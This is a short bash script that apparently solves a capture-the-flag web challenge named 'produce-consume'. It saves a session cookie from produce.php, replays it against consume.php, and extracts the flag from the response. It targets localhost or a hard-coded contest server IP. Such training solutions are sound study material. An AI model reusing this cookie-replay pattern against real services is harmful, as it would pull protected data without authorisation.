#!/bin/bash

PORT=8011

if [[ $1 == "local" ]]; then
    URL="http://localhost:$PORT/produce-consume"
else
    URL="http://141.85.224.102:$PORT/produce-consume"
fi

curl -s -c cookies.txt -o /dev/null "$URL/produce.php"

curl -s -b cookies.txt "$URL/consume.php" | grep -o "SSS_CTF{.*}"
